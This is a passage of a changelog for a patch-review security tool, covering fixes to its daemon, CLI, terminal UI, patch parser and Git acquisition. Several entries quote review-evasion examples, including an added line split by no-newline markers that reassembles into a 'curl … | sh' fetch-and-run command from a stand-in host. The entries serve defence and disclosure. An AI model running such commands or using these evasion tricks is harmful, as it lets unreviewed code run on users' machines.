- **`review` on macOS reads keys through a reader that can wait on `/dev/tty`.** The patch is
  on stdin, so crossterm reads keys from `/dev/tty`, and its default reader registers that fd
  with kqueue, which refuses it on macOS (crossterm-rs/crossterm#500): `review` would fail on
  its first key read there. The tui crate enables crossterm's `use-dev-tty` feature on macOS
  only (select(2) through `filedescriptor`; adds `filedescriptor` 0.8.3 and `thiserror` 1 to
  the macOS build). Inferred from source, not observed on a Mac: the `macOS tests` job runs
  `cli/tests/review_tty.rs`, which is the check.

- **A `review.hunks` selection that repeats a name can no longer abort the daemon.** Each repeat
  of a path in `paths` pushed every hunk of that file again, so 50,000 repeats of one path over
  4,000 hunks (a 619 KB request) asked for 3.2 GB; under a 2 GB address-space limit the
  allocation failed and the daemon aborted (`SIGABRT`, which `catch_unwind` cannot contain),
  losing every session and leaving its socket and lock behind. Repeated `addresses` duplicated
  the same way. A repeated name now selects its hunks once, keeping the order of first mention,
  so a selection never holds more hunks than the review has; the answer to `["x.rs","x.rs"]` is
  the answer to `["x.rs"]` (`views.rs` `select`). Also reached through `review.change`
  `view=hunks` and the MCP `review_hunks` tool.
- **`review.hunks` by address hashes each hunk once per request.** Every requested address
  recomputed every hunk's address (a SHA-256 of the hunk), so the cost grew with addresses times
  hunks: 4,000 addresses over 4,000 hunks (a 490 KB request) held a worker for 18 s, measured on
  the release build, while admission weighed it by its line length. The selection now builds one
  address table per call, as `findings.verify` has since DDF-PERF-001, and looks each address up
  in it; paths are looked up through a path table the same way.
- **Error answers are held to the 80 MiB line cap.** Only a success was bounded, and an error
  repeats request text: one unknown path of 27 million U+202E characters (an 81 MB request) drew
  a 243 MB error line, because `display_safe` writes each 3-byte character as the 8-byte
  `\u{202e}`, and a client using the daemon's own `request` helper got "daemon response exceeds
  maximum size" instead of the `INVALID_PARAMS` meant. The cap was also measured before
  `json_line_safe`, which writes each line separator in 6 bytes rather than 3, so an id of
  U+2028 characters came back at twice its size. Now an error message is cut at 4 KiB
  (`MAX_ERROR_MESSAGE_BYTES`, at a character boundary, with the count of bytes left out), an
  unknown address or path is repeated within 1 KiB and an unknown param name or session id
  within 256 bytes (`display_safe_bounded`), and every answer `process_line` returns is measured
  as written; one over the cap becomes `RESOURCE_EXHAUSTED` (8), without the id when the id alone
  would put it over.
- **MCP tool errors are held to the same 4 KiB message bound as the socket.** The cut was only
  in the socket's `error_response`, and the MCP server reads a daemon error's message directly,
  so `review_change` with a repo of 100,000 U+202E characters (a 600 KB request) answered with a
  901 KB tool error (measured, release build); `review.change` repeated each request-named path
  or value whole, three times its size for bidi characters, and the MCP server repeated an
  unknown tool, argument or method name whole. Now `RpcError::new` cuts the message where it is
  built, `review.change` repeats a request-named path or value within 1 KiB, the MCP server
  repeats a tool, argument or method name within 1 KiB, and every MCP tool and protocol error is
  cut to `MAX_ERROR_MESSAGE_BYTES`; the same request now answers in 1.3 KB.
- **`review.hunks` by address holds memory for the requested addresses, not for every hunk.**
  The address table kept every hunk's 64-character address, whatever was asked, so one address
  over 300,000 one-line hunks peaked at 195 MB against 130 MB for a path selection (measured,
  release build), memory that admission does not weigh. The table now keeps only the requested
  addresses a hunk has, each hunk's address still computed once; the same request peaks at
  130 MB.
- **`daemon health` and `daemon stop` no longer say there is no daemon when it is at its
  connection limit.** A daemon serving eight connections closes a ninth at once, unanswered (by
  design), and the client's reset or broken pipe was reported as `no daemon at PATH`: eight idle
  connections made the CLI report a running daemon absent for 30 s, and eight that each send a
  request within 30 s kept it so indefinitely (measured). A reset, broken pipe, early end of file
  or read timeout now reads `no answer from the daemon at PATH (it may be at its connection limit;
  retry)`, still exit 6; `no daemon at` is kept for a missing or refused socket.
- **Refused request lines are counted in `daemon.metrics`.** A line that is not UTF-8, one over
  the 80 MiB cap and one sent during a stop were answered by the connection itself and never
  counted, so `ddf_daemon_requests_total{method="(unknown)"}` and its `parse_error`,
  `invalid_request` and `resource_exhausted` errors under-reported them (three of four parse
  errors were missing in a measured run). They are now counted under `(unknown)`, on the socket
  and in `deep-diff-forge rpc` (`serve::refusal`).
- **The daemon's memory guidance describes parallel requests.** `docs/OPERATIONS_AND_DAEMON.md`
  still said the daemon "runs one request at a time", from before 0.4.0; it now sizes the peak
  for the requests admission lets run together (two at the 64 MiB budget) and for the waiting
  lines, which are parsed before admission and not counted in its budget.
- **`envelope` wraps the wrapped command's `--help`.** `envelope -- --stdin-patch --help` and
  `envelope -- council --help` printed envelope's own help as plain text with exit 0, ran
  nothing and printed no `ddf.result.v1` object, because the help scan read every word, including
  those after `--`. The scan (`args::help_requested`) now stops at `--` and skips an option's
  value, so `--hunks --path -h` selects the file named `-h` and `review --findings -h` reads it,
  where both printed help. `review` takes the word `help` only first (`review help`): a later
  `help`, as in `review --side help`, printed the help with exit 0 and is now refused as an
  unexpected argument (exit 2). `council` keeps its own scan, so `council … --session -h` still
  prints the council help.
- **A second output mode is refused, not dropped.** `--jsonl --rank` printed only JSONL,
  `--json --layout inline` only JSON, `--cluster --layout inline` only the cluster,
  `--acquisition-json --rank` only the acquisition, and `--jsonl --hunks --path nothing` skipped
  the path check, each with exit 0. `--jsonl`, `--layout`, `--acquisition-json` and a `--json`
  that is not the format of `--rank`, `--cluster`, `--outline` or `--hunks` now join the one-mode
  check (exit 2, before input is read), and `--address` with `--path` is refused there too: it
  was checked only after the patch was read, so a patch that failed to parse exited 4 instead.
- **A single-valued option given twice is refused.** The first value was used and a later one
  was never read or validated: `--parallel 4 --parallel bogus` ran with 4, `--max-bytes 1000000
  --max-bytes 2048` printed a page 34 times the appended budget, and `--repo . --repo /nonexistent`
  reviewed `.`, all with exit 0. `args::admit` now exits 2 (`--parallel given more than once`);
  `--address`, `--path`, `--allow-repo` and `--workload` stay repeatable.
- **`chain-contract` states the shipped pipe and stdin behaviour.** It promised that pipe
  failures exit non-zero, but a closed stdout (`| head`) deliberately exits 0, and that stdin is
  read only with an explicit flag, but `findings verify` and `review` read the patch there
  without one. It now says a closed pipe exits 0, any other write failure exits 3, and names
  every command that reads stdin; `docs/CHAINING_AND_CLUSTERING.md` says the same.
- **A failed write of output without a final newline exits 3.** Stdout is line-buffered, so a
  tail after the last newline was written at exit, where the error is dropped:
  `highlight` of a file with no final newline into `/dev/full` exited 0 with the output lost.
  `emit` and `envelope` now flush and report the failure (exit 3; a closed pipe stays exit 0).
- **MCP `review_patch` with `paths` summarises the files it returns.** The `summary` kept the
  whole patch's totals, so a `review.v0` holding one file said `files_changed: 2`, and in
  `review-summary.v0` too; `selected` echoed a repeated path. The summary is now counted over
  the kept files (the seal stays the whole patch's) and `selected` lists each path once.
- **`envelope` exits 128 + N when signal N ends the wrapped command.** It exited 1, which the
  exit-code registry does not list, so `explain` could not describe it. 128 + N is the status a
  shell reports for the same command (`exit::SIGNAL_BASE`, not a registry code); the envelope
  still says `outcome: signal` and the signal number.
- **Go raw strings no longer hide the code after them from evidence.** The lexical scanner did
  not know Go's backtick strings and read their text as code, so a `/*` in a glob
  (`` filepath.Glob(`/tmp/build/*.o`) ``) opened a block comment that blanked every later line
  of the hunk, a `//` in a URL ended the line and a `"` opened a phantom string: the
  `exec.Command` and `http.Get` after them gave no `process_spawn` or `network_fetch`. A
  backtick now opens a Go string that runs no escapes and is followed across lines.
- **A `#` inside a quoted YAML scalar or a quoted shell word is no longer a comment.** Any
  word-start `#` ended a YAML line, so `echo "step #1" && curl … | sh` in a `run: |` block,
  `run: "echo ' #'; curl …"` and a flow mapping with a `"x #"` key before
  `pull_request_target` lost their `network_fetch` and `ci_privilege` evidence. YAML quotes are
  now tracked (a `''` or, in double quotes, a backslash escape; not after a word byte, so
  `it's` is text), and their contents are still kept as code.
- **The line that closes a multi-line string keeps its evidence.** Each line began as plain
  code, so the quote that closes a multi-line string (Rust, a shell string, a JS template, a
  Python string continued with `\`) opened a phantom string, and the `unsafe`, `curl`, `eval`
  or `os.system` after it was blanked. A string still open at the end of a line is now carried
  to the next line of the hunk, which is read both as code and as resuming inside the string;
  both readings go on down the hunk, and a byte any reading keeps is code.
- **A quote misread as an opener no longer hides the rest of the hunk.** An unreleased
  version of the fix above carried only the reading that resumed the string, so an apostrophe
  in text (`It's`, in a Go hunk that opens inside a raw help string) stayed open from line to
  line until a real quote "closed" it, and a `/*` in the string after it (a glob) opened a
  block comment that blanked every later line: the `http.Get` and `exec.Command` below gave no
  evidence. The same held in JS, Rust and Python. The plain reading, which resumes no string,
  now always goes on as well (with at most three others), so a line keeps at least what a scan
  without carried strings keeps.
- **Rust raw C strings are raw.** `cr"C:\"` and `cr#"…"#` were read as ordinary strings, whose
  `\"` escapes the closing quote, so the `unsafe` after one on the same line was blanked. The
  raw-string prefix check now accepts one `b` or `c` before the `r`.
- **A change to a whitespace-only string literal is no longer called formatting only.** The
  structural diff dropped every whitespace-only leaf as layout, but tree-sitter has no layout
  leaves: the leaves dropped were string contents, so `""` to `" "`, or a tab to two spaces,
  gave `reformat_only: true` in `structural` and in `analyze`'s coverage. A raw string's
  delimiters are no leaf either, so `f(a)` to `f(r"a")` changed no token. A string literal is
  now one token of its exact text, as a comment is; a token change inside a literal is reported
  as the whole literal removed and added.
- **The long-line linearity test no longer fails on a busy host.** `graph`'s
  `the_import_rule_is_linear_on_long_lines` bounded its scans by 10 s of wall time; at load 56
  to 89 a linear scan using 1.8 s of CPU took over 10 s, failed the suite, and turned diff
  mutation results into false "caught" verdicts. It now bounds the scans' own thread CPU time
  (Linux `/proc/thread-self/schedstat`, wall time elsewhere) at 15 s, and keeps a 120 s
  wall-clock deadline only against hangs. Measured: linear code passes under 64 busy loops
  (20 s wall), and the quadratic import rule it guards against (`eee2b4c^`) still fails at 66.7 s
  of CPU time. Shrinking the lines was rejected: at 20,000 units the quadratic rule took 0.4 s.
- **Serde-built JSON no longer prints raw DEL or C1 controls** (bug hunt 2026-11-01). The
  `--hunks` and `--outline` views, `rpc`, MCP, the daemon socket and the review CLI are written
  by serde_json, which escapes only C0, and then passed through `core::json_line_safe`, which
  escaped only `U+2028`/`U+2029`; a patch path, `@@` heading or line holding the 8-bit CSI
  (`U+009B`) or OSC (`U+009D`) introducer reached the terminal raw, against SECURITY.md's DEL/C1
  promise. The pretty-printed documents (`findings verify`, `deploy doctor --json`, `eval --json`
  and `bench --json`) skipped `json_line_safe` altogether, so `findings verify` printed a
  finding's patch path, and `deploy doctor` its `--socket` path, with the raw CSI. `json_line_safe`
  now escapes `U+007F..=U+009F` too (the decoded document is unchanged), every pretty-printed
  document goes out through it, and the view pager and MCP's fit loop measure pages as escaped,
  so a page of C1 text still fits `max_bytes` (measured before: 14,255 bytes printed for an
  8,192-byte page).
- **Every Unicode default-ignorable code point is an `invisible` hazard and is escaped**
  (bug hunt 2026-11-01). `is_invisible` was a hand-picked list that missed the Mongolian free
  variation selectors `U+180B`-`U+180D` and `U+180F`, the Khmer inherent vowels `U+17B4`/`U+17B5`,
  `U+2065`, `U+206A`-`U+206F`, `U+FFF0`-`U+FFF8`, `U+1BCA0`-`U+1BCA3`, `U+1D173`-`U+1D17A` and the
  rest of `U+E0000`-`U+E0FFF`; `let ok = is_admin\u{180B};` (rustc accepts it as a distinct
  identifier) showed no hazard and printed exactly as `is_admin`. With `is_bidi` it now covers
  the whole `Default_Ignorable_Code_Point` set, so hazards, `display_safe` and untrusted-text
  sanitising all catch them.
- **`--layout inline` and `side-by-side` note a change their rows print as unchanged** (bug
  hunt 2026-11-01). Both layouts printed only each line's text, so a change to the end-of-file
  newline alone, a change between two non-UTF-8 bytes (both shown as `U+FFFD`), a trailing space,
  a no-break space against a space, a tab against the spaces it advances to (a broken Makefile)
  and, in side-by-side, a change past the column width (the cut hid it) looked unchanged. A `\`
  note row now follows a lossy line (`\ non-UTF-8 line, shown lossily`), a line without a final
  newline (`\ No newline at end of file`) and an added line whose printed text looks the same as
  its removed pair's (`\ differs from its pair only in bytes shown alike`, which also catches a
  literal `\x1b` against a raw `ESC`). Each layout judges the pair by what it prints: side-by-side
  by its cut, padded cells with a tab as four spaces, inline by raw tabs at 8-column terminal
  tab stops from the text's column. Letters that only look alike (Cyrillic `а` against Latin `a`)
  are not noted.
- **`InlineRow` and `SideCell` are `#[non_exhaustive]`** (review 2026-11-01). The entry above
  adds their `lossy` and `no_newline` fields, which already breaks a struct literal outside
  `deep-diff-forge-projection` (unpublished, and no workspace crate builds one); without the
  attribute every later flag would break it again. Read the fields and build rows with
  `inline_rows` and `side_rows`; a `compile_fail` doctest pins it.
- **The layouts' columns stay aligned past line 9999** (bug hunt 2026-11-01). The line-number
  fields were a fixed `{:>4}`, so rows at line 10000 and later pushed the side-by-side ` | `
  gutter and inline's marker column one place right. The fields are now as wide as the file's
  largest line number (at least 4).
- **A view cursor outside its selection is refused** (bug hunt 2026-11-01). `resume` checked a
  cursor's patch and selection but not its positions, so a forged or corrupted cursor past a
  hunk's end answered that hunk as `complete: true` with no lines, `remaining_hunks: 0` and no
  `next_cursor` (exit 0), one past the selection answered an empty page with nothing remaining,
  and `+0.05` was read as `0.5`. A position must now be canonical decimal and inside the selection
  (a hunk's line or a file's hunk, or `0`); anything else is `ViewError::Cursor` (CLI exit 2).
- **`PatchHunk::address` no longer claims to name exactly one hunk** (bug hunt 2026-11-01). Two
  byte-identical hunks at the same ranges in repeated sections of one path share an address, by
  design (views select every copy, findings resolve to the first); the rustdoc and README said
  otherwise. Documentation only: the hash is unchanged, so addresses stay stable.
- **A file whose section started past row 65,535 of the review could not be shown.** The diff
  pane scrolled through ratatui's `u16` paragraph offset, so selecting such a file drew another
  file's rows under its title and tree marker, no key could scroll past the cap, and `v` marked
  the unseen file reviewed (reproduced with a 70,000-line file before a one-line one). The pane,
  the file tree and the command panel now draw only their visible rows, unscrolled, from `usize`
  offsets; `ReviewApp::scroll` and `ReviewApp::panel_scroll` return `usize` (a breaking change
  for a caller that stores them as `u16`).
- **A key took 7.2 s on a 900,000-line patch.** Every frame built and syntax-painted a row for
  every line of every file, then showed about 20 of them, so each key, resize or mouse burst cost
  time and memory in proportion to the review. The diff pane now counts rows in one cheap walk
  and builds only the visible window, and the tree builds only its visible rows. Measured on the
  same patch: 12 to 24 ms per key and 197 MB, from 7.2 s and 1.3 GB. Wrapped rows of ASCII text
  are counted without being segmented; the first frame after `w` takes 0.18 s. Each frame still
  walks the whole review once to count its rows.
- **The default inline view dropped tab characters.** `display_safe` keeps a tab, and ratatui
  discards it as a control character, so tab indentation, and a dedent such as `return` moving
  out of an `if` in Python, looked unchanged; side-by-side and wrapped rows were right. Tabs are
  now expanded to four spaces before any untrusted text becomes a span (`safe_span`,
  `themed_spans`) and before the row's tint is measured. `projection` gains `expand_tabs` and
  `clip_cells`.
- **A mouse click on the file tree could select the wrong file.** The click mapper assumed a
  40-column, unscrolled tree: after the tree scrolled, a click selected the file that row would
  hold at the top (`f02.txt` for a click on `f23.txt`), on an 80-column terminal a click inside
  the diff changed the selection, and above 125 columns a click on the right of the tree focused
  the diff instead of selecting a file. The event loop now builds a `HitMap` of each frame it
  draws (the pane rectangles inside their borders and the tree's scroll; `HitMap::of`), and
  `map_mouse` resolves a click against it, so a click selects the row it lands on and a click on
  any border, the diff pane's included, or on the status bar does nothing (a breaking change to
  `map_mouse`'s signature; `SelectTreeRow` now carries a row of the whole tree). The map is kept
  by the loop, not the app: `render` only reads the `ReviewApp`, which stays `Send` and `Sync`.
- **Invisible format characters passed `display_safe` unescaped.** The invisible-character list
  missed assigned default-ignorable code points such as U+17B4 KHMER VOWEL INHERENT AQ, which
  Rust accepts inside an identifier: `let is_admin\u{17b4} = …` rendered like the removed
  `let is_admin = …`, with no hazard note. The Khmer inherent vowels, the Mongolian free
  variation selectors, the deprecated format characters U+206A to U+206F, the interlinear
  annotation controls, the shorthand format controls and the musical format controls are now
  escaped, reported as the `invisible` hazard, and dropped from untrusted annotation text.
- **A long or wide file name pushed a note's grounding label off the pane.** The note box
  measured its title and body in characters, not terminal cells, and never shortened the file
  name, so a CJK or 70-character name clipped `partially_grounded` and the box's corner. The box
  now measures in cells, clips the name with `…` so the label and corner fit, and wraps and pads
  its body by cell width.
- **Enter did nothing in the review view, though the README said it opens the file.** Enter now
  opens the selected file's diff: focus moves to the diff pane. It still runs the selected
  command in the palette.
- **A checked-out submodule's own filter no longer runs during working-tree acquisition.**
  `--ignore-submodules=none` (the H1-02 fix) made `git diff` run `git status` inside each
  submodule to see whether it was dirty, and that Git read the submodule's configuration
  (`.git/modules/<name>/config`, or the submodule's own `.git`) and `.gitattributes` and ran its
  clean filter: DDF turned off only the superproject's filters, so `--git-working-tree`, the
  daemon and MCP ran code from a repository someone handed you. Acquisition now passes
  `--ignore-submodules=dirty`: the commit each submodule records is still compared whatever
  `diff.ignoreSubmodules` or `.gitmodules` say, and Git never runs inside a submodule. A
  submodule's uncommitted changes, which the superproject never stores, are no longer marked
  `-dirty`.
- **A `\ No newline at end of file` marker must end its side of the file.** The marker drops the
  newline of the line before it, so Git joins the next line of that side onto it: `+cu`, a
  marker, `+rl -fsSL https://e.example/x | s`, a marker, `+h` was reviewed as three harmless
  added lines (rank 2) while `git apply` wrote one `curl … | sh` line (rank 5, `network_fetch`).
  A later line of a side a marker ended, in the same hunk or a later hunk of the file, now
  refuses the patch with `InvalidEofMarker` at the marker (exit 4). Git's own forms (a marker
  after the old side's last line, then the new side's lines) still parse.
- **CRLF patch headers name the paths Git applies.** The parser split lines on LF only, so a
  header kept its carriage return: `--- /dev/null\r` was not `/dev/null`, and an added
  `.github/workflows/ci.yml` was reviewed as `modified .github/workflows/ci.yml\r` (rank 5
  instead of 8, with its `new_file`, `ci_privilege` and `config_or_lockfile` signals lost); a
  CRLF mode line was refused as an invalid mode. As `git apply` does, the carriage returns ending
  a header line (`---`, `+++`, extended headers, hunk headers) are now dropped. Body lines keep
  theirs (content), and a CR inside a quoted name (`"x\r"`) is still part of the path and still
  `control`.
- **Header paths lose their first component, as `git apply -p1` strips it.** Only a literal
  `a/` or `b/` was stripped, so `--- vendor/build.rs` was reviewed as vendored code (rank 5, no
  `build_hook`) while Git wrote the top-level `build.rs` (rank 9), a `diff.mnemonicPrefix` diff
  was reviewed as `w/build.rs`, and `diff -ru old/ new/` output kept `new/`. The first component
  is now stripped whatever it is (a path with no `/` is kept whole).
- **`rename old`/`rename new` headers are refused.** `git apply` reads them as `rename from`/
  `rename to`; DDF ignored them, so the rename was reviewed as `modified <new>` with no sign that
  the old path is removed. No current Git writes them, so they now refuse the patch with
  `UnsupportedFormat` (exit 4) rather than being translated. A `diff --git a/x b/y` with no
  rename header at all is still reviewed as `modified y` (open: the direct two-file comparison
  depends on it, and the model has no old-path field).
- **A `diff --git` line is split where both halves name one path, before the ` b/` guess.** The
  rightmost ` b/` was tried first, so `diff --git a/x b/y b/x b/y` with a mode change was
  reviewed as `mode_changed y` while `git apply` changed `x b/y`, and the mnemonic
  `diff --git i/a b/c w/a b/c` as `c` instead of `a b/c`; `i/x "w/x"` got an empty path. The line
  is now split as `git_header_name` splits it, for any prefixes and a quoted second half, and
  the rightmost ` b/` is used only when the halves name different files (the mode change of two
  files compared with `git diff --no-index`).
  A name split this way that holds a NUL is refused with `InvalidPath`, as a NUL in any other
  header name is: kept, it rendered as a quoted `\000` that the parser refused (fuzz, PR #83).
- **A file section that names no path is refused.** A `diff --git i/x w/y` (or CRLF `i/x w/x`)
  mode change with no `---`/`+++` was reviewed as a file with an empty path (exit 0); Git
  refuses it ("lacks filename information"), as it refuses a hunk with no file headers, which
  DDF also reviewed with an empty path. Such a section now refuses the patch with `InvalidPath`
  at its first line (exit 4).
- **Repeated slashes in a header path are squashed, as Git squashes them.**
  `--- a/.github//workflows/ci.yml` was reviewed as `.github//workflows/ci.yml` (no
  `ci_privilege`) while Git wrote `.github/workflows/ci.yml`; the same held for `---`/`+++` in a
  Git diff and for `rename from`/`rename to`.
- **A traditional diff keeps the old name when it prefixes the new one.** `--- a/build.rs` with
  `+++ b/build.rs.new` was reviewed as `modified build.rs.new` (no `build_hook`) while
  `git apply` changed `build.rs`: without `diff --git`, Git prefers the shorter name when the old
  name is a strict prefix of an unquoted new one. The parser now chooses as Git does.
- **An epoch timestamp creates or deletes the file in a traditional diff.**
  `--- a/new.sh<TAB>1970-01-01 00:00:00.000000000 +0000` (the `diff -N` form) was reviewed as
  `modified new.sh`, losing `new_file`, while Git created the file; an epoch on the `+++` side
  deletes the file the `+++` names. The parser now reads the epoch in any zone, as
  `has_epoch_timestamp` does (not with a fraction other than zero, a CRLF line end, or in a Git
  diff, where Git does not either).
- **`-p0` is guessed from the patch, as `git apply` guesses it.** After a traditional diff whose
  new name has no `/` (`--- x`/`+++ x`), Git keeps every later path whole, so a later
  `.github/workflows/ci.yml` was reviewed as `workflows/ci.yml`, losing `ci_privilege`. The
  parser now makes the same guess and holds it for the rest of the patch.
- **A traditional header name ends where Git's does.** A `diff -u` date after spaces
  (`--- a/build.rs 2026-01-01 12:00:00`) stayed in the path (`build.rs 2026-01-01 12:00:00`,
  no `build_hook`), an unquoted CR inside a `---`/`+++` name stayed in it while Git wrote the
  name before it, and `/dev/null` followed by a space was a path rather than a creation. Names
  are now read as `find_name_traditional` reads them: a trailing date after a tab or spaces
  ends the name, otherwise a tab or CR does.

### Security

- **CodeQL is a required check** (2026-11-02). Ruleset 25868121 now requires `codeql (rust)` and
  `codeql (actions)` as well, thirteen checks in all, after 14 consecutive passing runs of 4 to
  5 minutes. Before this, a failed or cancelled CodeQL run did not block a merge.
- **A filter in a repository's `config.worktree` no longer runs during Git acquisition.**
  Acquisition turned off only the filters `git config --local` lists, which does not read
  `$GIT_DIR/config.worktree` (used once `extensions.worktreeConfig` is set), so a filter defined
  there ran and its output was reviewed in place of the file. Acquisition now lists every scope
  with `--show-scope` and turns off each filter any unprotected scope defines (local, worktree,
  their includes, and any scope it does not know). Filters from the user's global and system
  configuration, such as Git LFS, stay on by decision (SECURITY.md); a test with planted global
  and system files proves that nothing else they name (fsmonitor, external diff, textconv, a
  diff driver command, set directly or through `include.path`/`includeIf`) runs.
- **A repository filter whose name is not UTF-8 refuses the acquisition.** The name was
  decoded lossily (`\xff` became U+FFFD) before DDF named it to Git, and Git matches a subsection
  name byte for byte, so the override named another filter and the repository's own ran. Passing
  the raw bytes fixed it on Linux, but the macOS CI job measured the filter still running: macOS
  Git's `--get-regexp ^filter\.` did not match a key that is not UTF-8, so the filter was never
  listed. Acquisition now lists every key (`git config --list`) and picks the `filter.` keys
  itself, and any such name refuses the acquisition on every platform (`InvalidSelection`).
- **The caller's `GIT_CONFIG_COUNT`/`KEY`/`VALUE` configuration is kept.** DDF numbered its
  filter overrides from 0 and set the count, which replaced the caller's own entries (all of them
  when the repository defined no filter). They are now numbered after the caller's count (from
  `GitAcquireOptions::env`, else inherited); a count Git reads but DDF does not (a leading
  space) is refused as `InvalidSelection`.
- **Every release binary is run before it ships.** The x86_64 macOS binary was cross-built and
  only checksummed; the release smoke now runs it under Rosetta 2 (installed if missing) after
  checking it is x86_64. A test fails if any release target is built without being run.
- **The crates.io job fails closed.** With the owner's gate open (`DDF_CRATES_IO=open`) and no
  `CARGO_REGISTRY_TOKEN`, it used to exit 0 without publishing; it now fails. It runs in a
  `release` environment that only `v*` tags can deploy to.
- **Release tags are immutable.** A tag ruleset (`refs/tags/v*`: no deletion, no update, no
  non-fast-forward, no bypass) stops a published tag being moved to other code.
- **Code scanning.** `codeql.yml` runs CodeQL (security-extended) over the Rust code and the
  workflows on pull requests, pushes to `main` and weekly. Not a required check yet.
- **Pinned actions are enforced.** `cli/tests/workflow_pins.rs` fails when any `uses:` in any
  workflow is not a local path or a full 40-hex commit SHA.

### Tests

- **The gate sandbox's surviving mutants are closed** (`review/src/sandbox.rs`): tests pin `--cpus=<host CPUs − 1, min 1>` in argv and receipt, refuse a blank runtime or an empty image by name, and bound control-command output at 64 KiB; one `>=` deadline mutant is argued equivalent (EVIDENCE.md).
- **`mutation_scope`'s quadratic-scan guard fails instead of hanging.** Its 1 MiB `#` run is
  scanned under a 30 s deadline, so the test binary exits and eager `#` counting, which
  `code_lines_skip_comments_and_attributes_across_lines` already fails, is reported as caught,
  not as a timeout (EVIDENCE.md, "Review crate: mutation_scope mutation").
- **Council admission boundaries are pinned:** nine `review` contract tests kill the 16 `policy.rs`/`model.rs` mutants that survived the whole-crate run (EVIDENCE.md).
- **The Python `StdioClient` timeout covers the request write.** `_exchange` wrote the request
  with a blocking `write` and `flush`, and only the read had a deadline: a request larger than
  the pipe buffer (64 KiB; any real patch) sent to a child that had stopped reading blocked
  forever, and the child was never killed (measured: `timeout=1.0`, a 1 MiB patch, `sleep 30` as
  the child, killed by an outer 8 s `timeout`). Both pipes are now non-blocking and one selector
  writes the request in chunks and reads the answer under one deadline; on expiry the child is
  killed and `TransportError` raised (measured: after 1.0 s). A child that answers and closes
  before taking the whole request is read, not reported as "not reading".
- **Learning store: an append never glues a receipt onto an unterminated last line.**
  `append_receipt` wrote at the end without checking the last byte. After a torn write, or a hand
  edit that dropped the final newline (which `load_receipts` accepts), the next `learn record`
  exited 0 but merged its receipt into that line: every later `learn status` failed with exit 3
  (`trailing characters`), and deleting the bad line also lost the new receipt. The append now
  writes a newline first when the store does not end in one, so the new receipt is its own line
  and a torn fragment stays a separate, visible corrupt line.
- **The Python client maps every invalid answer to `TransportError` and kills the child.** An
  answer that was not UTF-8 or not JSON escaped `_Client.call` as a raw `UnicodeDecodeError` or
  `JSONDecodeError` (both transports) and left the stdio child running; an answer for another
  request id did not kill it either. They now raise `TransportError("not a valid response: …")`
  as the Rust SDK does, and `StdioClient` kills the child. A finding holding a lone surrogate,
  which `json.loads` accepts but UTF-8 cannot carry, raised a bare `UnicodeEncodeError` for the
  whole `verify_findings` batch; it now raises `ValueError` naming the finding's index before
  anything is sent (the CLI, reading JSONL bytes, refuses such a line as `malformed`; one request
  cannot carry it at all).
- **A stored receipt may hold only receipt fields (anchor A-05).** `load_receipts` parsed each
  line with serde's default, which drops unknown keys, so a hand-edited line carrying a `path` or
  `source` key was counted and scored, against the documented promise that a line holding a path
  is refused, naming its line. A stored line with a key that is not a receipt field is now
  refused (`receipt store line N: invalid receipt: a stored receipt holds a key that is not a
  receipt field`, exit 3); the key is not echoed, since it may be the path. `learn record --stdin`
  still drops extra keys, as the privacy probe requires: they are never written.
- **A relative `XDG_STATE_HOME` or `XDG_RUNTIME_DIR` is ignored.** `resolve_learning_dir`
  accepted any non-empty value, so `XDG_STATE_HOME=relstate` put the learning store under the
  working directory, often the repository under review. The XDG Base Directory spec makes a
  relative value invalid: the resolver now falls back to `$HOME/.local/state`, and a relative
  `$HOME` gives `NoStateDir`. The daemon's `runtime_base_from` had the same gap for its socket;
  a relative `XDG_RUNTIME_DIR` now fails closed like an unset one (`daemon path` exits 2).
- **`doctor` names the state directory the learning store uses.** It formatted `$XDG_STATE_HOME`
  as is, so after the resolver began ignoring a relative value, `XDG_STATE_HOME=relstate
  deep-diff-forge doctor` printed `state_dir=relstate/deep-diff-forge`, a place nothing writes
  to, while `learn record` wrote under `$HOME/.local/state`. `state_dir` is now the parent of the
  store's own resolved directory (the daemon socket and runtime dir already used the daemon's
  resolvers), and with no absolute `$XDG_STATE_HOME` or `$HOME` it prints `<unset: …>`.
- **A deeply nested answer is a `TransportError` too, and the stdio child is killed.** An answer
  of about 200 KB of `[` made `json.loads` raise `RecursionError`, which `_Client.call` did not
  map, so it escaped raw on both transports and left the `StdioClient` child running (measured).
  It is now `TransportError("not a valid response: …")` like any other invalid answer.
- **`StdioClient` returns an early answer from a child that stops reading but stays alive.** The
  exchange kept waiting to write the rest of the request until the deadline, though the whole
  answer was already read: a child that refused a 1 MiB request and then slept gave
  `TransportError: no answer within 2 s` instead of its refusal (measured). A complete answer line
  now ends the exchange. Its unsent tail would garble the next request, so the out-of-step child
  is killed and the next call raises `TransportError`.
- **A path and a line resolve in every section with the path.** `findings verify` searched only
  the first file section with a finding's path, so in a concatenated patch that names one file
  twice, a line in the later section was refused as `line_outside_hunk` although its address
  form was accepted. `resolve`, the cockpit's `annotations` (which fell back to a file note) and
  `validate_anchor` (which refused a later section's hunk or span) now search every section with
  the path, in review order; a path without a line still anchors to the first.
- **A relative run directory no longer lets the candidate shrink the sealed mutation scope.**
  `council prepare <request> run` with a `mutation_base` handed Git the snapshot as relative
  `run/source/<path>` lines on `hash-object --stdin-paths`, and Git runs inside the reviewed
  repository, so it hashed `<repository>/run/source/<path>` instead of the sealed copy. With
  nothing there, prepare failed (exit 4, `Git acquisition command failed`); with an ignored copy
  planted there holding a changed file's base bytes, the file matched its base blob and was left
  out of `mutation.diff` and its sealed `mutation_diff_sha256` (measured: a changed `y.rs` dropped,
  and with every changed file planted, an empty diff). `prepare` now names the run absolutely
  (its canonical parent joined with its name) before anything is written.
- **`council import-tuicr --execute` no longer writes a journal its own reader refuses.** Appends
  checked only that the journal length was unchanged, never the 64 MiB cap `load_journal`
  enforces, so imports of large comments (measured: three 22 MiB ones) took `decisions.jsonl` to
  69,208,645 bytes, after which every import of the run, dry runs included, was refused until the
  append-only journal was edited by hand. The planned events are now encoded and refused before
  anything is written when they would pass the cap, in a dry run as in an execute (exit 4,
  `tuicr import refused (journal): ... would pass its 67108864-byte cap; nothing was appended`).
  A journal already over the cap is reported as a journal refusal, not as `tuicr export refused
  (run): artifact exceeds acquisition budget`.

- **The pre-push secret hook no longer lets a force push over an unfetched remote tip through
  unscanned.** For an existing branch it scanned `<remote tip>..<local>`; when the remote tip was
  not in the local clone (a `--force` push after someone else updated the branch), git could not
  resolve the range, gitleaks 8.30.1 logged the error, reported "0 commits scanned, no leaks
  found" and exited 0, and a committed token reached the remote (measured). The hook now scans
  `<local> --not --remotes=<remote>` whenever the remote tip is not a local commit, and refuses
